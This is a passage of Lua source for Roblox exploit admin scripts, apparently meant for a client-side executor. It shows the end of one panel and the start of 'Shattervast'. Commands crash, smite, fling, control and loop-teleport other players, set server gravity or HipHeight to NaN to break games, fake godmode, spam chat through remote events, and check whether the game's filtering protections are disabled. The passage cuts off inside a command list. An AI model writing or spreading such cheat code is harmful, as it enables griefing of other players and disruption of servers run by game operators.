		end
	end
end)

ADD_COMMAND('unhl','unhl [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		if PCHAR:FindFirstChild('Torso') then
			for i,v in pairs(PCHAR.Torso:GetChildren()) do
				if v:IsA('SpotLight') and v.Name == 'seth_hl' then
					v:destroy()
				end
			end
		end
	end
end)

ADD_COMMAND('crash','crash [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		PCHAR.Torso.Anchored = true
		for i,v in pairs(PCHAR:GetChildren()) do
			if v:IsA('Humanoid') then
				for i = 1,10 do
					v.HipHeight = 1/0*0
				end
			end
		end
	end
end)

ADD_COMMAND('shutdown','shutdown',{},
function(ARGS, SPEAKER)
	workspace.Gravity = 1/0*0
end)

ADD_COMMAND('smite','smite [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		spawn(function()
			local function CastRay(A, B, C) local V = B - A return workspace:FindPartOnRayWithIgnoreList(Ray.new(A, V.unit * math.min(V.magnitude, 999)), C or {}, false, true) end
			
			local PP = PCHAR.PrimaryPart.Position - Vector3.new(0, 3, 0)
			local S = Instance.new('Sound', workspace) S.SoundId = 'rbxassetid://178090362' S.Volume = 1 S:Play() spawn(function() wait(7) S:destroy() end)
			local S,P2 = CastRay(PP, PP - Vector3.new(0, 9, 0), {PCHAR})
			
			local P1 = Instance.new('Part', game.Workspace)
			P1.BrickColor = BrickColor.new('Institutional white')
			P1.Material = 'Neon'
			P1.Transparency = 0.9
			P1.Anchored = true
			P1.CanCollide = false
			P1.Size = Vector3.new(0.2, 0.2, 0.2)
			P1.CFrame = CFrame.new((S and P2 or PP) + Vector3.new(0, 1e3, 0))
			Instance.new('BlockMesh', P1).Scale = Vector3.new(10, 10000, 10)
			
			local P2, P3, P4, P5 = P1:Clone(), P1:Clone(), P1:Clone(), P1:Clone()
			for i, v in next, {P2, P3, P4, P5} do i = i * 0.1 v.Parent, v.Size = P1, Vector3.new(0.2 + i, 0.2, 0.2 + i ) v.CFrame = P1.CFrame end wait(0.5) P1:destroy() PCHAR:BreakJoints()
		end)
	end
end)

ADD_COMMAND('skydive','skydive [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		spawn(function()
			for i = 0, 3 do
				if PCHAR then
					PCHAR.HumanoidRootPart.CFrame = PCHAR.HumanoidRootPart.CFrame + Vector3.new(0, 7500, 0)
				end
			end
		end)
	end
end)

ADD_COMMAND('message','message [string]',{'m'},
function(ARGS, SPEAKER)
	spawn(function()
		if MG then
			MESSAGE(GLS(false, 0))
		else
			LOAD_MESSAGE(GLS(false, 0))
		end
	end)
end)

ADD_COMMAND('control','control [plr]',{},
function(ARGS, SPEAKER)
	local PLAYERS = GET_PLAYER(ARGS[1], SPEAKER)
	for i,v in pairs(PLAYERS) do
		local PCHAR = _PLAYERS[v].Character
		local HB = Instance.new('HopperBin', LP.Backpack) HB.Name = _PLAYERS[v].Name
		local CONTROL_ENABLED = false
		local function CONTROL(P, V3)
			if CONTROL_ENABLED then
				if P.Character and P.Character:FindFirstChild('Humanoid') then
					P.Character.Humanoid:MoveTo(V3)
				end
			end
		end
		HB.Selected:connect(function(M)
			M.Button1Down:connect(function() CONTROL_ENABLED = true CONTROL(_PLAYERS:FindFirstChild(HB.Name), M.Hit.p) end)
			M.Button1Up:connect(function() CONTROL_ENABLED = false end)
		end)
	end
end)

-- / extra

ADD_COMMAND('gravity','gravity [int]',{},
function(ARGS, SPEAKER)
	workspace.Gravity = ARGS[1]
end)

ADD_COMMAND('fixlighting','fixlighting',{'fixl'},
function(ARGS, SPEAKER)
	FIX_LIGHTING()
end)

ADD_COMMAND('fixfog','fixfog',{'clrfog'},
function(ARGS, SPEAKER)
	_LIGHTING.FogColor = C3(191, 191, 191)
	_LIGHTING.FogEnd = 100000000
	_LIGHTING.FogStart = 0
end)

ADD_COMMAND('day','day',{},
function(ARGS, SPEAKER)
	_LIGHTING.TimeOfDay = 14
end)

ADD_COMMAND('night','night',{},
function(ARGS, SPEAKER)
	_LIGHTING.TimeOfDay = 24
end)

ADD_COMMAND('serverlock','serverlock',{'slock'},
function(ARGS, SPEAKER)
	SERVER_LOCKED = true
end)

ADD_COMMAND('unserverlock','unserverlock',{'unslock'},
function(ARGS, SPEAKER)
	SERVER_LOCKED = false
end)

ADD_COMMAND('fogend','fogend [int]',{},
function(ARGS, SPEAKER)
	_LIGHTING.FogEnd = ARGS[1]
end)

ADD_COMMAND('fogcolor','fogcolor [r] [g] [b]',{},
function(ARGS, SPEAKER)
	if ARGS[1] and ARGS[2] and ARGS[3] then
		_LIGHTING.FogColor = C3(ARGS[1], ARGS[2], ARGS[3])
	end
end)

ADD_COMMAND('noclip','noclip',{},
function(ARGS, SPEAKER)
	NOCLIP = true
	JESUSFLY = false
	SWIM = false
end)

ADD_COMMAND('clip','clip',{},
function(ARGS, SPEAKER)
	NOCLIP = false
end)

ADD_COMMAND('jesusfly','jesusfly',{},
function(ARGS, SPEAKER)
	NOCLIP = false
	JESUSFLY = true
	SWIM = false
end)

ADD_COMMAND('nojfly','nojfly',{},
function(ARGS, SPEAKER)
	JESUSFLY = false
end)

ADD_COMMAND('swim','swim',{},
function(ARGS, SPEAKER)
	NOCLIP = false
	JESUSFLY = false
	SWIM = true
end)

ADD_COMMAND('noswim','noswim',{},
function(ARGS, SPEAKER)
	SWIM = false
end)

ADD_COMMAND('fly','fly',{},
function(ARGS, SPEAKER)
	sFLY()
end)

ADD_COMMAND('unfly','unfly',{},
function(ARGS, SPEAKER)
	NOFLY()
end)

ADD_COMMAND('prefix','prefix [string]',{},
function(ARGS, SPEAKER)
	if ARGS[1] then
		C_PREFIX = ARGS[1]
		NOTIFY('Changed prefix to \'' .. ARGS[1] .. '\'', 255, 255, 255)
	end
end)

ADD_COMMAND('version','version',{},
function(ARGS, SPEAKER)
	NOTIFY('VERSION | ' .. VERSION, 255, 255, 255)
end)

ADD_COMMAND('fe','fe',{},
function(ARGS, SPEAKER)
	spawn(function()
		CHECK_FE()
	end)
end)

function OPEN_COMMANDS()
	SETH_MAIN.main.holder.Size = UDim2.new(1, 25, 12, 30)
	SETH_MAIN.main.holder.holders.search.Visible = true
end

function CLOSE_COMMANDS()
	SETH_MAIN.main.holder.holders.search.Visible = false
	SETH_MAIN.main.holder.Size = UDim2.new(1, 25, 12, 0)
end

function OPEN_TAB(TAB)
	if not _CORE:FindFirstChild('seth_main') then OPEN_MAIN() end
	for a,b in pairs(SETH_MAIN.main.holder.holders:GetChildren()) do
		if b.Name ~= TAB then
			b.Visible = false
		else
			b.Visible = true
		end
		if TAB ~= 'cmds' then
			CLOSE_COMMANDS()
		else
			OPEN_COMMANDS()
		end
	end
end

ADD_COMMAND('serverinfo','serverinfo',{'sinfo'},
function(ARGS, SPEAKER)
	OPEN_TAB('server')
end)

ADD_COMMAND('admins','admins',{},
function(ARGS, SPEAKER)
	OPEN_TAB('admins')
end)

ADD_COMMAND('cmds','cmds',{'commands'},
function(ARGS, SPEAKER)
	OPEN_TAB('cmds')
end)

ADD_COMMAND('bans','bans',{},
function(ARGS, SPEAKER)
	OPEN_TAB('bans')
end)

ADD_COMMAND('fun','fun',{},
function(ARGS, SPEAKER)
	OPEN_TAB('fun')
end)

ADD_COMMAND('changelog','changelog',{},
function(ARGS, SPEAKER)
	OPEN_TAB('changelog')
end)

ADD_COMMAND('credits','credits',{},
function(ARGS, SPEAKER)
	OPEN_TAB('credits')
end)

MOUSE.KeyDown:connect(function(key)
	if key:byte() == 29 then
		if not NOCLIP then
			ECOMMAND('noclip')
		elseif NOCLIP then
			ECOMMAND('clip')
		end
	elseif key:byte() == 30 then
		if not JESUSFLY then
			ECOMMAND('jesusfly')
		elseif JESUSFLY then
			ECOMMAND('nojfly')
		end
	end
end)

-- / after loaded

function CHECK_FE()
	if not workspace.FilteringEnabled then
		NOTIFY('Filtering is disabled', 50, 255, 50)
	elseif workspace.FilteringEnabled then
		NOTIFY('Filtering is ENABLED', 255, 50, 50)
	end
end

CMD_BAR_H.bar:TweenPosition(UDim2.new(0, 0, 1, -50), 'InOut', 'Quad', 0.5, true)

local GOING_IN = true
CMD_BAR_H.bar.Changed:connect(function()
	if CMD_BAR_H.bar.Text ~= 'press ; to execute a command' and CMD_BAR_H.bar.Focused and not GOING_IN then
		if CMD_BAR_H.bar.Text ~= '' then
			if not CMD_BAR_H.bar.Text:find(' ') then
				CMD_BAR_H.bar.commands.Visible = true
				CMD_BAR_H.bar.commands:ClearAllChildren()
				CMD_BAR_H.bar.commands.CanvasSize = UDim2.new(0, 0, 0, 0)
				local Y_COMMANDS = 0
				for i,v in pairs(COMMANDS) do
					if v.N:find(CMD_BAR_H.bar.Text) then
						CMD_BAR_H.bar.commands:TweenSize(UDim2.new(1, 0, 1, -200), 'InOut', 'Quad', 0.2, true)
						CMD_BAR_H.bar.commands.CanvasSize = CMD_BAR_H.bar.commands.CanvasSize + UDim2.new(0, 0, 0, 20)
						local COMMANDS_C = CMD_BAR_H.bar.commands_ex:Clone()
						COMMANDS_C.Position = UDim2.new(0, 0, 0, Y_COMMANDS)
						COMMANDS_C.Visible = true
						COMMANDS_C.Text = ' ' .. v.D
						COMMANDS_C.Parent = CMD_BAR_H.bar.commands
						Y_COMMANDS = Y_COMMANDS + 20
					end
				end
			end
		else
			CMD_BAR_H.bar.commands:TweenSize(UDim2.new(1, 0, 0, 0), 'InOut', 'Quad', 0.2, true)
			CMD_BAR_H.bar.commands:ClearAllChildren()
			CMD_BAR_H.bar.commands.CanvasSize = UDim2.new(0, 0, 0, 0)
		end
	end
end)

CMD_BAR_H.bar.FocusLost:connect(function()
	GOING_IN = true
	if CMD_BAR_H.bar.Text ~= '' then
		spawn(function()
			ECOMMAND(CMD_BAR_H.bar.Text, LP)
		end)
	end
	CMD_BAR_H.bar.commands:ClearAllChildren()
	CMD_BAR_H.bar.commands.CanvasSize = UDim2.new(0, 0, 0, 0)
	CMD_BAR_H.bar.commands:TweenSize(UDim2.new(1, 0, 0, 0), 'InOut', 'Quad', 0.2, true)
	CMD_BAR_H.bar:TweenPosition(UDim2.new(0, -225, 1, -50), 'InOut', 'Quad', 0.5, true)
end)

MOUSE.KeyDown:connect(function(K)
	if K:byte() == 59 then
		GOING_IN = false
		CMD_BAR_H.bar:TweenPosition(UDim2.new(0, 0, 1, -50), 'InOut', 'Quad', 0.5, true)
		CMD_BAR_H.bar:CaptureFocus()
	end
end)

NOTIFY('Hello, ' .. _PLAYERS.LocalPlayer.Name, 255, 255, 255)
CHECK_FE()
end)

b:Button("Shattervast",function()
   -- Have Fun!
-- IT FUCKING TAKE MY SELF 1 HOUR TO RESCRIPT THIS CAUSE SKISPLOIT CANT RUN THE FUCKING COREGUI
-- Re script by Alex games #9120
-- By illremember#3799

-- Important Loading
trueSettings = {
	commandPrefix = ";";
	hotkeys = {};
	fchotkeymode = "unfc";
}

-- Important Variables
gsPlayers = game:GetService("Players")
gsWorkspace = game:GetService("Workspace")
gsLighting = game:GetService("Lighting")
gsReplicatedStorage = game:GetService("ReplicatedStorage")
gsCoreGui = game:GetService("CoreGui")
gsTween = game:GetService("TweenService")
gsHttp = game:GetService("HttpService")

LP = gsPlayers.LocalPlayer
Mouse = LP:GetMouse()

defaultSettings = gsHttp:JSONEncode(trueSettings)
function CreateSave()
	writefile("Shattervast.txt", defaultSettings)
	wait(0.5)
	local content = readfile("Shattervast.txt")
	local trueValue = gsHttp:JSONDecode(content)
	commandPrefix = trueValue.commandPrefix
	hotkeys = trueValue.hotkeys
	fchotkeymode = trueValue.fchotkeymode
end
function fullUpdate()
	local updatedSettings = {
		commandPrefix = commandPrefix;
		hotkeys = hotkeys;
		fchotkeymode = fchotkeymode;
	}
	local fullUPDATED = gsHttp:JSONEncode(updatedSettings)
	wait(0.2)
	writefile("Shattervast.txt", fullUPDATED)
end
if writefile ~= nil then
	function builder()
		local TESTsave = readfile("Shattervast.txt")
		if TESTsave == nil then
			return false
		else
			return true
		end
	end
	local success, message = pcall(builder)
	if success == true then
		function reader()
			local content = readfile("Shattervast.txt")
			local trueValue = gsHttp:JSONDecode(content)
			commandPrefix = trueValue.commandPrefix
			hotkeys = trueValue.hotkeys
			if trueValue.fchotkeymode == nil then
				fchotkeymode = "unfc"
				fullUpdate()
			else
				fchotkeymode = trueValue.fchotkeymode
			end
		end
		reader()
	elseif success == false then
		CreateSave()
	end
else
	commandPrefix = ";"
	hotkeys = {}
	fchotkeymode = "unfc"
end

CurrentGravity = gsWorkspace.Gravity
CurrentWalkspeed = LP.Character.Humanoid.WalkSpeed
CurrentJumppower = LP.Character.Humanoid.JumpPower
CurrentHipheight = LP.Character.Humanoid.HipHeight
CurrentNormal = LP.DevCameraOcclusionMode

gsWorkspace.Camera.Changed:Connect(function()
	gsWorkspace.Camera.FieldOfView = 70
end)

-- Important Functions
function view(plr)
	if plr.Character.Humanoid ~= nil then
		gsWorkspace.CurrentCamera.CameraSubject = plr.Character.Humanoid
	else
		gsWorkspace.CurrentCamera.CameraSubject = plr.Character.Head
	end
end
function unlockWS()
	for i,part in pairs(gsWorkspace:GetDescendants()) do
		if part:IsA("Part") then
			part.Locked = false
		end
	end
end
function lockWS()
	for i,part in pairs(gsWorkspace:GetDescendants()) do
		if part:IsA("Part") then
			part.Locked = true
		end
	end
end
function FEGodmode()
	local changeview = false
	if gsWorkspace.CurrentCamera.CameraSubject == LP.Character.Humanoid or gsWorkspace.CurrentCamera.CameraSubject == LP.Character then
		changeview = true
	end
	LP.Character.Humanoid.Name = 1
	local l = LP.Character["1"]:Clone()
	l.Parent = LP.Character
	l.Name = "Humanoid"
	wait(0.1)
	LP.Character["1"]:Destroy()
	if changeview then
		game:GetService("Workspace").CurrentCamera.CameraSubject = LP.Character
	end
	LP.Character.Animate.Disabled = true
	wait(0.1)
	LP.Character.Animate.Disabled = false
	LP.Character.Humanoid.DisplayDistanceType = "None"
end
function RocketPropulsion(maxthrust,maxspeed,thrustp,targetplr,name)
	local l = Instance.new("RocketPropulsion")
	l.Parent = LP.Character.HumanoidRootPart
	l.CartoonFactor = 1
	l.MaxThrust = maxthrust
	l.MaxSpeed = maxspeed
	l.ThrustP = thrustp
	l.Name = name
	l.Target = targetplr.Character.HumanoidRootPart
	l:Fire()
end
function createIntro(style, msg, length)
	if gsCoreGui:FindFirstChild("Notification") then
		gsCoreGui:FindFirstChild("Notification"):Destroy()
	end
	local info = "http://www.roblox.com/asset/?id=1281284684"
	local warning = "http://www.roblox.com/asset/?id=1281286925"
	if style == "info" then
		style = info
	elseif style == "warning" then
		style = warning
	end
	local Notification = Instance.new("ScreenGui")
	local Frame = Instance.new("Frame")
	local TextLabel = Instance.new("TextLabel")
	local IMAGE = Instance.new("ImageLabel")
	Notification.Name = "Notification"
	Notification.Parent = game.Players.LocalPlayer.PlayerGui
	Notification.ResetOnSpawn = false
	Frame.Parent = Notification
	Frame.BackgroundColor3 = Color3.new(0.164706, 0.164706, 0.164706)
	Frame.BackgroundTransparency = 0.20000000298023
	Frame.BorderSizePixel = 0
	Frame.Position = UDim2.new(0, 0, -0.2, 0)
	Frame.Size = UDim2.new(1, 0, 0, 30)
	TextLabel.Parent = Frame
	TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
	TextLabel.BackgroundTransparency = 1
	TextLabel.Size = UDim2.new(1, 0, 1, 0)
	TextLabel.Font = Enum.Font.SourceSansLight
	TextLabel.Text = msg
	TextLabel.TextColor3 = Color3.new(0.905882, 0.905882, 0.905882)
	TextLabel.TextScaled = true
	TextLabel.TextSize = 14
	TextLabel.TextWrapped = true
	IMAGE.Parent = Frame
	IMAGE.BackgroundTransparency = 1
	IMAGE.Size = UDim2.new(0, 50, 0, 50)
	IMAGE.Position = UDim2.new(0.1, 0, 0, 0)
	IMAGE.Image = style
	local Intro = Instance.new("ScreenGui")
	local Frame2 = Instance.new("Frame")
	local IMAGE2 = Instance.new("ImageLabel")
	Intro.Name = "Intro"
	Intro.Parent = game.Players.LocalPlayer.PlayerGui
	Intro.ResetOnSpawn = false
	Frame2.Parent = Intro
	Frame2.BackgroundTransparency = 1
	Frame2.BorderSizePixel = 0
	Frame2.Position = UDim2.new(0, 0, -0.2, 0)
	Frame2.Size = UDim2.new(1, 0, 0, 30)
	IMAGE2.Parent = Frame
	IMAGE2.BackgroundTransparency = 1
	IMAGE2.AnchorPoint = Vector2.new(0.5, 0)
	IMAGE2.Size = UDim2.new(0, 240, 0, 120)
	IMAGE2.Position = UDim2.new(0.5, 0, 0, 0)
	IMAGE2.Image = "http://www.roblox.com/asset/?id=1795472522"
	Frame2:TweenPosition(UDim2.new(0, 0, 0, 200), "Out", "Quad", 1.5)
	Frame:TweenPosition(UDim2.new(0, 0, 0, 0), "Out", "Quad", 1.5)
	wait(length)
	pcall(function()
		Frame:TweenPosition(UDim2.new(0, 0, -1.5, 0), "Out", "Quad", 3)
		Frame2:TweenPosition(UDim2.new(0, 0, -1.5, 0), "Out", "Quad", 3)
	end)
	wait(3.01)
	Intro:Destroy()
	Notification:Destroy()
end
function Notification(style, msg, length)
	if gsCoreGui:FindFirstChild("Notification") then
		gsCoreGui:FindFirstChild("Notification"):Destroy()
	end
	local info = "http://www.roblox.com/asset/?id=1281284684"
	local warning = "http://www.roblox.com/asset/?id=1281286925"
	if style == "info" then
		style = info
	elseif style == "warning" then
		style = warning
	end
	local Notification = Instance.new("ScreenGui")
	local Frame = Instance.new("Frame")
	local TextLabel = Instance.new("TextLabel")
	local IMAGE = Instance.new("ImageLabel")
	Notification.Name = "Notification"
	Notification.Parent = game.Players.LocalPlayer.PlayerGui
	Notification.ResetOnSpawn = false
	Frame.Parent = Notification
	Frame.BackgroundColor3 = Color3.new(0.164706, 0.164706, 0.164706)
	Frame.BackgroundTransparency = 0.20000000298023
	Frame.BorderSizePixel = 0
	Frame.Position = UDim2.new(0, 0, -0.2, 0)
	Frame.Size = UDim2.new(1, 0, 0, 30)
	TextLabel.Parent = Frame
	TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
	TextLabel.BackgroundTransparency = 1
	TextLabel.Size = UDim2.new(1, 0, 1, 0)
	TextLabel.Font = Enum.Font.SourceSansLight
	TextLabel.Text = msg
	TextLabel.TextColor3 = Color3.new(0.905882, 0.905882, 0.905882)
	TextLabel.TextScaled = true
	TextLabel.TextSize = 14
	TextLabel.TextWrapped = true
	IMAGE.Parent = Frame
	IMAGE.BackgroundTransparency = 1
	IMAGE.Size = UDim2.new(0, 50, 0, 50)
	IMAGE.Position = UDim2.new(0.1, 0, 0, 0)
	IMAGE.Image = style
	Frame:TweenPosition(UDim2.new(0, 0, 0, 0), "Out", "Quad", 1.5)
	wait(length)
	pcall(function()
		Frame:TweenPosition(UDim2.new(0, 0, -1.5, 0), "Out", "Quad", 3)
	end)
	wait(3.01)
	Notification:Destroy()
end
function hasTools()
	local a = false
	local b = false
	for i,v in pairs(LP.Character:GetDescendants()) do
		if v:IsA("Tool") then
			if v ~= nil then
				a = true
			else
				a = false
			end
		end
	end
	for i,k in pairs(LP.Backpack:GetDescendants()) do
		if k:IsA("Tool") then
			if k ~= nil then
				b = true
			else
				b = false
			end
		end
	end
	return a or b
end
Compliments = {" is the coolest person in this server!", ", I really like your avatar!", ", I really want to be your friend!", " is truly amazing. Truly!", " is incredible!", ", you are my favourite here!!", ", I am complimenting you right now at this very moment.", " you are really awesome", " when will you be my friend!?", " is such a great person", " is a fantastic person!"}
function complimentplr(player)
	local plrName = player.Name
	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(plrName..Compliments[math.random(1, #Compliments)], "All")
end
function createINFO(player)
	local InfoGUIv2 = Instance.new("ScreenGui")
	local Frame = Instance.new("Frame")
	local Frame_2 = Instance.new("Frame")
	local infoguiCLOSE = Instance.new("TextButton")
	local Frame_3 = Instance.new("Frame")
	local playerName = Instance.new("TextLabel")
	local Frame_4 = Instance.new("Frame")
	local playerAvatar = Instance.new("ImageLabel")
	local playerAccAge = Instance.new("TextLabel")
	local playerId = Instance.new("TextLabel")
	local playerOs = Instance.new("TextLabel")
	local playerMembership = Instance.new("TextLabel")
	local Frame_5 = Instance.new("Frame")
	local Frame_6 = Instance.new("Frame")
	InfoGUIv2.Name = "InfoGUIv2"
	InfoGUIv2.Parent = game.Players.LocalPlayer.PlayerGui
	InfoGUIv2.ResetOnSpawn = false
	Frame.Parent = InfoGUIv2
	Frame.BackgroundColor3 = Color3.new(0, 0, 0)
	Frame.BackgroundTransparency = 1
	Frame.BorderColor3 = Color3.new(0, 0, 0)
	Frame.ClipsDescendants = true
	Frame.Position = UDim2.new(0.45, 0, 1, 0)
	Frame.Size = UDim2.new(0, 265, 0, 302)
	Frame.ZIndex = -1
	Frame_2.Parent = Frame
	Frame_2.BackgroundColor3 = Color3.new(0.290196, 0, 0.447059)
	Frame_2.BorderSizePixel = 0
	Frame_2.Size = UDim2.new(0, 260, 0, 20)
	infoguiCLOSE.Name = "infoguiCLOSE"
	infoguiCLOSE.Parent = Frame_2
	infoguiCLOSE.BackgroundColor3 = Color3.new(1, 1, 1)
	infoguiCLOSE.BackgroundTransparency = 1
	infoguiCLOSE.BorderSizePixel = 0
	infoguiCLOSE.Position = UDim2.new(0, 230, 0, 0)
	infoguiCLOSE.Size = UDim2.new(0, 30, 0, 20)
	infoguiCLOSE.Font = Enum.Font.SourceSansBold
	infoguiCLOSE.Text = "X"
	infoguiCLOSE.TextColor3 = Color3.new(0.992157, 0.992157, 0.992157)
	infoguiCLOSE.TextSize = 20
	Frame_3.Parent = Frame
	Frame_3.BackgroundColor3 = Color3.new(0.482353, 0.121569, 0.635294)
	Frame_3.BorderSizePixel = 0
	Frame_3.Position = UDim2.new(0, 0, 0, 20)
	Frame_3.Size = UDim2.new(0, 260, 0, 40)
	playerName.Name = "playerName"
	playerName.Parent = Frame_3
	playerName.BackgroundColor3 = Color3.new(1, 1, 1)
	playerName.BackgroundTransparency = 1
	playerName.Position = UDim2.new(0, 10, 0, 5)
	playerName.Size = UDim2.new(0, 240, 0, 30)
	playerName.Font = Enum.Font.SourceSansLight
	playerName.Text = player.Name
	playerName.TextColor3 = Color3.new(0.988235, 0.988235, 0.988235)
	playerName.TextScaled = true
	playerName.TextSize = 14
	playerName.TextWrapped = true
	Frame_4.Parent = Frame
	Frame_4.BackgroundColor3 = Color3.new(0.956863, 0.956863, 0.956863)
	Frame_4.BorderSizePixel = 0
	Frame_4.Position = UDim2.new(0, 0, 0, 60)
	Frame_4.Size = UDim2.new(0, 260, 0, 237)
	playerAvatar.Name = "playerAvatar"
	playerAvatar.Parent = Frame_4
	playerAvatar.BackgroundColor3 = Color3.new(1, 1, 1)
	playerAvatar.Position = UDim2.new(0, 85, 0, 10)
	playerAvatar.Size = UDim2.new(0, 85, 0, 85)
	playerAvatar.Image = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username="..player.Name
	playerAccAge.Name = "playerAccAge"
	playerAccAge.Parent = Frame_4
	playerAccAge.BackgroundColor3 = Color3.new(1, 1, 1)
	playerAccAge.BackgroundTransparency = 1
	playerAccAge.Position = UDim2.new(0, 5, 0, 101)
	playerAccAge.Size = UDim2.new(0, 250, 0, 30)
	playerAccAge.Font = Enum.Font.SourceSans
	playerAccAge.Text = "Account Age: "..player.AccountAge
	playerAccAge.TextColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
	playerAccAge.TextScaled = true
	playerAccAge.TextSize = 14
	playerAccAge.TextWrapped = true
	playerId.Name = "playerId"
	playerId.Parent = Frame_4
	playerId.BackgroundColor3 = Color3.new(1, 1, 1)
	playerId.BackgroundTransparency = 1
	playerId.Position = UDim2.new(0, 5, 0, 131)
	playerId.Size = UDim2.new(0, 250, 0, 30)
	playerId.Font = Enum.Font.SourceSans
	playerId.Text = "Account ID: "..player.UserId
	playerId.TextColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
	playerId.TextScaled = true
	playerId.TextSize = 14
	playerId.TextWrapped = true
	playerOs.Name = "playerOs"
	playerOs.Parent = Frame_4
	playerOs.BackgroundColor3 = Color3.new(1, 1, 1)
	playerOs.BackgroundTransparency = 1
	playerOs.Position = UDim2.new(0, 5, 0, 161)
	playerOs.Size = UDim2.new(0, 250, 0, 30)
	playerOs.Font = Enum.Font.SourceSansLight
	playerOs.Text = "Player OS: "..player.OsPlatform
	playerOs.TextColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
	playerOs.TextScaled = true
	playerOs.TextSize = 14
	playerOs.TextWrapped = true
	playerMembership.Name = "playerMembership"
	playerMembership.Parent = Frame_4
	playerMembership.BackgroundColor3 = Color3.new(1, 1, 1)
	playerMembership.BackgroundTransparency = 1
	playerMembership.Position = UDim2.new(0, 5, 0, 191)
	playerMembership.Size = UDim2.new(0, 250, 0, 30)
	playerMembership.Font = Enum.Font.SourceSansLight
	if player.MembershipType == Enum.MembershipType.None then
		playerMembership.Text = "No builder's club."
	elseif player.MembershipType == Enum.MembershipType.BuildersClub then
		playerMembership.Text = "Builder's club!"
	elseif player.MembershipType == Enum.MembershipType.TurboBuildersClub then
		playerMembership.Text = "Turbo Builder's club!"
	elseif player.MembershipType == Enum.MembershipType.OutrageousBuildersClub then
		playerMembership.Text = "Outrageous Builder's club!"
	end
	playerMembership.TextColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
	playerMembership.TextScaled = true
	playerMembership.TextSize = 14
	playerMembership.TextWrapped = true
	Frame_5.Parent = Frame
	Frame_5.BackgroundColor3 = Color3.new(0, 0, 0)
	Frame_5.BackgroundTransparency = 0.69999998807907
	Frame_5.BorderColor3 = Color3.new(0, 0, 0)
	Frame_5.BorderSizePixel = 0
	Frame_5.ClipsDescendants = true
	Frame_5.Position = UDim2.new(0, 10, 0, 10)
	Frame_5.Selectable = true
	Frame_5.Size = UDim2.new(0, 255, 0, 292)
	Frame_5.ZIndex = -1
	Frame_6.Parent = Frame
	Frame_6.BackgroundColor3 = Color3.new(0, 0, 0)
	Frame_6.BackgroundTransparency = 0.69999998807907
	Frame_6.BorderColor3 = Color3.new(0, 0, 0)
	Frame_6.BorderSizePixel = 0
	Frame_6.ClipsDescendants = true
	Frame_6.Position = UDim2.new(0, 8, 0, 8)
	Frame_6.Selectable = true
	Frame_6.Size = UDim2.new(0, 255, 0, 292)
	Frame_6.ZIndex = -1
	local closeGet = {}
	closeGet.Size = UDim2.new(0, 0, 0, 0)
	local openGet = {}
	openGet.Position = UDim2.new(0.45, 0, 0.45, 0)
	local closeFunction = gsTween:Create(Frame, TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), closeGet)
	local openFunction = gsTween:Create(Frame, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), openGet)
	infoguiCLOSE.MouseButton1Click:Connect(function()
		closeFunction:Play()
		Frame:TweenPosition((Frame.Position + UDim2.new(0, 265 / 2, 0, 302 / 2)), "InOut", "Sine", 2)
		wait(2.01)
		Frame:Destroy()
	end)
	openFunction:Play()
	local UserInputService = game:GetService("UserInputService")
	local dragging
	local dragInput
	local dragStart
	local startPos
	local function update(input)
		local delta = input.Position - dragStart
		local dragTime = 0.055
		local SmoothDrag = {}
		SmoothDrag.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		local dragSmoothFunction = gsTween:Create(Frame, TweenInfo.new(dragTime, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), SmoothDrag)
		dragSmoothFunction:Play()
	end
	Frame.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = Frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	Frame.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging and Frame.Size == UDim2.new(0, 265, 0, 302) then
			update(input)
		end
	end)
end
function clientSided()
	Notification("info", "This command is for the client (you) only, no one else can see!", 6)
end
searchCmds={"1 print [msg] - Prints a message to the developer console","2 warn [msg] - Warns a message to the developer console","3 sit - Makes you sit","4 god - Activates FE Godmode (breaks tools)","5 view [plr] - Changes your camera subject to another player","6 unview - Changes your camera back to your player","7 gravity [num] - Changes workspace gravity to [num]","8 ungravity - Reverts workspace gravity to game's default","9 goto [plr] - Teleports you to a player","10 fecheck - Checks whether the game is FE or not","11 lockws - Locks the whole workspace","12 unlockws - Unlocks the whole workspace","13 noclip - Allows you to walk through walls and other objects","14 clip - Stops noclip, can collide","15 follow [plr] / [num] - Makes you follow a player constantly, optional [num] for how far away to follow","16 unfollow - Stops you from following","17 fling [plr] / [pow] - Uses your character to fling a player, optional [pow] for how much power to put into the fling","18 unfling - Stops you from flinging","19 trail [plr] / [num] - Makes you trail (walk infront) of a player constantly, optional [num] for how far away to trail","20 untrail - Stops you from trailing","21 annoy [plr] - Loop teleports you to the player","22 unannoy - Stops loop teleporting you","23 reset - Resets your character","24 grespawn 